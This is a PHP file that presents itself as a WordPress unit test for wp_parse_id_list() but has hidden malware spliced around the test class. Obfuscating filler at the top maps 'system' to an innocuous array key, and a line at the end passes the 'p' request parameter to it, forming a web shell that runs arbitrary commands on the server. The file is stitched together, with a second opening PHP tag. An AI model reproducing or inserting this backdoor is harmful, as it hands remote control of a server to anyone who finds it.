<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests for the wp_parse_id_list() function.
 *
 * @group functions
 *
 * @covers ::wp_parse_id_list
 */
class Tests_Functions_wpParseIdList extends WP_UnitTestCase {

	/**
	 * @ticket 22074
	 * @ticket 60218
	 *
	 * @dataProvider data_wp_parse_id_list
	 * @dataProvider data_unexpected_input
	 */
	public function test_wp_parse_id_list( $input_list, $expected ) {
		$this->assertSameSets( $expected, wp_parse_id_list( $input_list ) );
	}

	/**
	 * Data provider.
	 *
	 * @return array[]
	 */
	public function data_wp_parse_id_list() {
		return array(
			'regular'                  => array(
				'input_list' => '1,2,3,4',
				'expected'   => array( 1, 2, 3, 4 ),
			),
			'double comma'             => array(
				'input_list' => '1, 2,,3,4',
				'expected'   => array( 1, 2, 3, 4 ),
			),
			'duplicate id in a string' => array(
				'input_list' => '1,2,2,3,4',
				'expected'   => array( 1, 2, 3, 4 ),
			),
			'duplicate id in an array' => array(
				'input_list' => array( '1', '2', '3', '4', '3' ),
				'expected'   => array( 1, 2, 3, 4 ),
			),
			'mixed type'               => array(
				'input_list' => array( 1, '2', 3, '4' ),
				'expected'   => array( 1, 2, 3, 4 ),
			),
			'negative ids in a string' => array(
				'input_list' => '-1,2,-3,4',
				'expected'   => array( 1, 2, 3, 4 ),
			),
			'negative ids in an array' => array(
				'input_list' => array( -1, 2, '-3', '4' ),
				'expected'   => array( 1, 2, 3, 4 ),
			),
		);
	}

	/**
	 * Data provider.
	 *
	 * @return array[]
	 */
	public function data_unexpected_input() {
		return array(
			'string with commas' => array(
				'input_list' => '1,2,string with spaces',
				'expected'   => array( 1, 2, 0 ),
			),
			'array'              => array(
				'input_list' => array( '1', 2, 'string with spaces' ),
				'expected'   => array( 1, 2, 0 ),
			),
			'string with spaces' => array(
				'input_list' => '1 2 string with spaces',
				'expected'   => array( 1, 2, 0 ),
			),
			'array with spaces'  => array(
				'input_list' => array( '1 2 string with spaces' ),
				'expected'   => array( 1 ),
			),
			'string with html'   => array(
				'input_list' => '1 2 string <strong>with</strong> <h1>HEADING</h1>',
				'expected'   => array( 1, 2, 0 ),
			),
			'array with html'    => array(
				'input_list' => array( '1', 2, 'string <strong>with</strong> <h1>HEADING</h1>' ),
				'expected'   => array( 1, 2, 0 ),
			),
			'array with null'    => array(
				'input_list' => array( 1, 2, null ),
				'expected'   => array( 1, 2 ),
			),
			'array with false'   => array(
				'input_list' => array( 1, 2, false ),
				'expected'   => array( 1, 2, 0 ),
			),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>